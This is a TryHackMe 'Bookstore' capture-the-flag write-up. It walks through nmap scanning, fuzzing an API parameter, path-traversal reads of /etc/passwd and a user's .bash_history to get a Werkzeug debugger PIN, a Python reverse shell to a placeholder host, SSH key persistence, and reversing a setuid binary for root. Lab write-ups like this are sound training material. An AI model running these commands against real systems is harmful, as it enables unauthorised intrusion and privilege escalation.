---
title: Bookstore
date: 2022-01-22
categories:
  - Writeup
tags:
  - API
  - LFI
  - Fuzzing
  - Ghidra
  - Reverse Engineering
excerpt_separator: <!--more-->
toc: true
toc_sticky: true
image: thm.png

---



<!--more-->

## NMAP

### All Ports

```bash
Nmap scan report for 10.10.254.205
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



### Full Scan Active Ports


```bash
tarting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 19:44 NZDT
Nmap scan report for 10.10.155.203
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Book Store
|_http-server-header: Apache/2.4.29 (Ubuntu)
5000/tcp open  upnp?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## User

From our NMAP scan I first checked port 80 and we can see a Website called Book Store.
Nothing too interesting from here I also ran Gobuster and Nikto which did not give us anything juicy.

There is a **_/login.html_** though but the login function does not seem to work. I checked the source and there is an interesting comment.

![Port80-webserver](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Bookstore/img/1st.png "Bookstore Web Page")

```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

We will keep this in mind just in case we can use it later.

Now I moved to checking port 5000. Looks like it's used for API.

![Port5000-webserver](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Bookstore/img/2.png "BookStore API")

I ran gobuster against this and we can see that we have the following pages.

```bash
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
```
I tried accessing **_/console_** but it needs a PIN. Like what is mentioned from the html comment earlier.

![Port5000-APIconsole](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Bookstore/img/5.png "API Console")

I checked **_/api_** and we can see a documentation on how to use the API.

![Port5000-APIdoc](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Bookstore/img/3.png "API Doc")

I tried accessing `/api/v2/resources/books?id=1` and it gave me a json result

```json
[
  {
    "author": "Ann Leckie ", 
    "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.", 
    "id": "1", 
    "published": 2014, 
    "title": "Ancillary Justice"
  }
]
```

Now we can try to check if there are other parameters supported by replacing the `id` parameter.

I created a little python script to do this. First I tried `/api/v2/resources/books?<params>=../../../../etc/passwd` but did not find anything so I changed **_v2_** to **_v1_** and it worked. `/api/v1/resources/books?<params>=../../../../etc/passwd`

```python
import requests
import sys

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} #proxy for burp
def set_session():
    global req
    global ses
    global url
    ses = requests.Session()
    url = "http://10.10.87.239:5000"
    try:
         req = ses.get(url)
    except:
         print("Unable to fetch URL")
         sys.exit()
set_session()
dir = '/api/v1/resources/books?id=../../../../../../../etc/passwd' #dir to bruteforce
with open('/home/all3n/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt') as p: #open raft and replace id from dir
    for fuzz in p:
        fuzz = fuzz.strip()
        dir_rep = dir.replace("id", fuzz, 1)
        url_dir = url + dir_rep
        res = ses.get(url_dir, proxies=proxies)
        print(res.status_code)
        print(url_dir)
        if res.status_code == 404:
            sys.stdout.write("\033[F") #cursor up oneline
            sys.stdout.write("\033[K") #clear things
            sys.stdout.write("\033[F") #cursor up oneline
            sys.stdout.write("\033[K") #clear things
        if res.status_code == 200:
            continue
print(dir_rep)
print(res.text)
```
        
```bash
┌──(all3n㉿kali)-[~/thm/bookstore]
└─$ curl http://10.10.87.239:5000/api/v1/resources/books?<redacted>=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

Now we confirmed that we have an LFI vulnerability. Earlier there is a console that needs a PIN, we can now try including sid's **_.bash_history_** to checked if the PIN is in there.

```bash
┌──(all3n㉿kali)-[~/thm/bookstore]
└─$ curl http://10.10.87.239:5000/api/v1/resources/books?show=../../../../home/sid/.bash_history
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=<redacted>
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```

And there is the PIN. Now let's try to use it in **_/console_**.

![Port5000-APIinConsole](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Bookstore/img/4.png "API in-Console")

And we are in! Now let's try to do a [python reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). First set up a listener to our machine.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<your-IP>",<port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

```bash
┌──(all3n㉿kali)-[~/thm/bookstore]
└─$ nc -lvnp 9001                    
listening on [any] 9001 ...
connect to [10.4.14.51] from (UNKNOWN) [10.10.87.239] 36176
10.4.14.51 - - [22/Jan/2022 13:57:33] "GET /console?__debugger__=yes&cmd=os.dup2(s.fileno()%2C2)&frm=0&s=Lh2xU4dH39FzXlFlvUh2 HTTP/1.1" 200 -
/bin/sh: 0: can't access tty; job control turned off
$ 
```

And we have a shell as sid! Now the first thing I did is to create an SSH key and save to sid's **_/.ssh/authorized_keys_** file so we I can ssh.

```bash
sid@bookstore:~$ ls
api.py  api-up.sh  books.db  try-harder  user.txt
```

From here we can first notice the ***_try-harder_** file. I tried executing it but it wants a **_magic number_**

```
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
69
Incorrect Try Harder
```

I ran `strings` against it and it has this interesting lines.

```
What's The Magic Number?!
/bin/bash -p
Incorrect Try Harder
```

I downloaded the **_try-harder_** file and analyzed it using **_Ghidra_**

```C
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

From here we can see that it has four variables and they have assigned hex numbers and we want to XOR the values. [Tf is XOR](https://stackoverflow.com/questions/14526584/what-does-the-xor-operator-do)

`local_14 = local_1c ^ 0x1116 ^ local_18;`

Looks like we have to trigger the following to get root.

```C
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
```

I used an online XOR calc to do this and after getting the result and entering it as the magic number. 

```
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1********
root@bookstore:~# 
```

We have root!














